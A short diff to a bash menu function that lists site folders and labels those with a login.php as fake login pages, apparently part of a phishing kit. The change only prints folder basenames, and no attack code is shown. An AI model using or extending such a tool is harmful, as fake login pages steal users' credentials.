@@ -6,9 +6,9 @@ list_folders() {
   for folder in sites/*/; do
     login_page="$folder/login.php"
     if [[ -f "$login_page" ]]; then
-      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter "$folder"
+      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter "$(basename "$folder")"
     else
-      printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$folder"
+      printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$(basename "$folder")"
     fi
     let counter++
   done
